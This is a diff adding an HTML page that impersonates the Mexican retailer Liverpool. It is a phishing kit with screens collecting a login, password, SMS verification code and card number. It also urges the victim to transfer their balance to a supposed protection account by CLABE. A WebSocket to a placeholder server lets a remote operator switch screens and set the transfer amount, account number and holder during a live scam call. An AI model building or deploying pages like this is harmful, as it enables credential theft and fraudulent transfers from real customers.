@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Pantallas BALONX - Cliente Liverpool</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #fff;
+      color: #333;
+    }
+
+    header {
+      background: #e10098;
+      color: white;
+      padding: 10px;
+      text-align: center;
+    }
+
+    .date {
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    .brands {
+      text-align: center;
+      margin: 20px;
+    }
+
+    .brands img {
+      margin: 0 5px;
+      height: 25px;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      min-height: 60vh;
+    }
+
+    .pantalla {
+      display: none;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 30px;
+      max-width: 450px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .pantalla.active {
+      display: block;
+    }
+
+    .pantalla input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .pantalla button {
+      background-color: #e10098;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .pantalla a {
+      display: block;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #0066cc;
+      text-decoration: none;
+    }
+
+    .barra-carga {
+      width: 100%;
+      background: #eee;
+      border-radius: 5px;
+      overflow: hidden;
+      margin-top: 20px;
+    }
+
+    .barra-carga div {
+      height: 20px;
+      width: 0;
+      background-color: #e10098;
+      animation: llenarBarra 3s linear forwards;
+    }
+
+    @keyframes llenarBarra {
+      0% { width: 0; }
+      100% { width: 100%; }
+    }
+
+    .icono-alerta {
+      font-size: 40px;
+      margin: 10px 0;
+      color: #555;
+    }
+
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      background: #f9f9f9;
+      padding: 20px 10px;
+      text-align: center;
+    }
+
+    .footer-bar {
+      background-color: #e10098;
+      color: white;
+      padding: 15px;
+      font-size: 12px;
+    }
+
+    footer a, .footer-bar a {
+      color: #e10098;
+      margin: 0 10px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Liverpool_logo_2022.svg" height="50">
+    <div class="date">1 de abril de 2025</div>
+  </header>
+
+  <div class="brands">
+    <p>Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg">
+  </div>
+
+  <div class="container">
+
+    <!-- Folio -->
+    <div class="pantalla" id="pantalla-folio">
+      <h2>Folio de soporte:</h2>
+      <p>Ingrese el folio que su ejecutivo le proporcionó.</p>
+      <input type="text" placeholder="Ingrese su número de folio">
+      <button>Ingresar</button>
+    </div>
+
+    <!-- Login -->
+    <div class="pantalla" id="pantalla-login">
+      <h2>Inicio de sesión:</h2>
+      <p>Ingrese su usuario y contraseña.</p>
+      <input type="text" placeholder="Usuario">
+      <input type="password" placeholder="Contraseña">
+      <button>Ingresar</button>
+    </div>
+
+    <!-- Código de verificación -->
+    <div class="pantalla" id="pantalla-codigo">
+      <h2>Hemos enviado un código de verificación</h2>
+      <p>Ingresa el código que recibiste en tu número celular terminación: <strong id="terminacion">2222</strong></p>
+      <input type="text" placeholder="Ingrese el SMS recibido">
+      <button>Continuar</button>
+    </div>
+
+    <!-- Proteger saldo -->
+    <div class="pantalla" id="pantalla-proteger">
+      <div class="icono-alerta">❗</div>
+      <h2>Es necesario proteger su saldo</h2>
+      <p>Se creará una cuenta de TOTAL PROTECCIÓN para respaldar su saldo.</p>
+      <div class="saldo">Saldo sin proteger: <strong id="saldo">$39499494</strong></div>
+    </div>
+
+    <!-- Transferencia -->
+    <div class="pantalla" id="pantalla-transferencia">
+      <h2>Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
+      <p>Transfiera la cantidad de <strong id="montoTransferencia">$39933</strong> a la siguiente cuenta:</p>
+      <p><strong>Clabe:</strong> <span id="clabe">272762626262727272727272266222</span></p>
+      <p><strong>Titular:</strong> <span id="titular">Nnwnwhwhw</span></p>
+      <p><strong>Alias:</strong> Cuenta de respaldo.</p>
+    </div>
+
+    <!-- Protección adicional -->
+    <div class="pantalla" id="pantalla-tarjeta">
+      <h2>Protección adicional</h2>
+      <p>Para evitar compras en línea no autorizadas, agregue protección a su tarjeta.</p>
+      <input type="text" placeholder="Número de tarjeta">
+      <button>Continuar</button>
+      <a href="#">Nueva aclaración</a>
+      <a href="#">Estatus de mis aclaraciones</a>
+    </div>
+
+    <!-- Cancelación exitosa -->
+    <div class="pantalla" id="pantalla-cancelacion">
+      <h2>Cancelación exitosa</h2>
+      <p>Hemos cancelado su cargo no reconocido de forma exitosa.</p>
+      <p><strong>Comercio:</strong> <span id="comercio">Wnwnhw</span><br>
+      <strong>Monto devuelto:</strong> <span id="montoDevuelto">$62622</span></p>
+      <p>El monto estará disponible en su tarjeta dentro de 72 horas.</p>
+    </div>
+
+    <!-- Validando -->
+    <div class="pantalla" id="pantalla-validando">
+      <h2>Validando...</h2>
+      <div class="barra-carga"><div></div></div>
+    </div>
+
+  </div>
+
+  <footer>
+    <a href="#">Aprende más</a>
+    <a href="#">Ayuda</a>
+    <a href="#">Términos y condiciones</a>
+    <a href="#">Seguridad en línea</a>
+  </footer>
+
+  <div class="footer-bar">
+    <a href="#">Contáctanos</a> |
+    <a href="#">Aclaraciones</a> |
+    <a href="#">Promociones</a> |
+    <a href="#">Facebook</a> |
+    <a href="#">Youtube</a>
+    <br><br>
+    © Liverpool México 2024. Todos los Derechos Reservados
+  </div>
+
+  <script>
+    const pantallas = {
+      folio: document.getElementById('pantalla-folio'),
+      login: document.getElementById('pantalla-login'),
+      codigo: document.getElementById('pantalla-codigo'),
+      proteger: document.getElementById('pantalla-proteger'),
+      transferencia: document.getElementById('pantalla-transferencia'),
+      tarjeta: document.getElementById('pantalla-tarjeta'),
+      cancelacion: document.getElementById('pantalla-cancelacion'),
+      validando: document.getElementById('pantalla-validando'),
+    };
+
+    function mostrarPantalla(nombre) {
+      Object.values(pantallas).forEach(p => p.classList.remove('active'));
+      if (pantallas[nombre]) pantallas[nombre].classList.add('active');
+    }
+
+    // Mostrar folio como pantalla inicial
+    mostrarPantalla('folio');
+
+    const socket = new WebSocket("wss://tu-servidor-websocket.com");
+
+    socket.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      if (data.tipo === "mostrar_folio") mostrarPantalla("folio");
+      if (data.tipo === "mostrar_login") mostrarPantalla("login");
+      if (data.tipo === "mostrar_codigo") {
+        document.getElementById("terminacion").textContent = data.terminacion || "2222";
+        mostrarPantalla("codigo");
+      }
+      if (data.tipo === "mostrar_proteger") {
+        document.getElementById("saldo").textContent = "$" + (data.saldo || "0");
+        mostrarPantalla("proteger");
+      }
+      if (data.tipo === "mostrar_transferencia") {
+        document.getElementById("montoTransferencia").textContent = "$" + (data.monto || "0");
+        document.getElementById("clabe").textContent = data.clabe || "XXXXXXXXXXXX";
+        document.getElementById("titular").textContent = data.titular || "Sin nombre";
+        mostrarPantalla("transferencia");
+      }
+      if (data.tipo === "mostrar_tarjeta") mostrarPantalla("tarjeta");
+      if (data.tipo === "mostrar_cancelacion") {
+        document.getElementById("comercio").textContent = data.comercio || "Desconocido";
+        document.getElementById("montoDevuelto").textContent = "$" + (data.monto || "0");
+        mostrarPantalla("cancelacion");
+      }
+      if (data.tipo === "mostrar_validando") mostrarPantalla("validando");
+    };
+  </script>
+
+</body>
+</html>
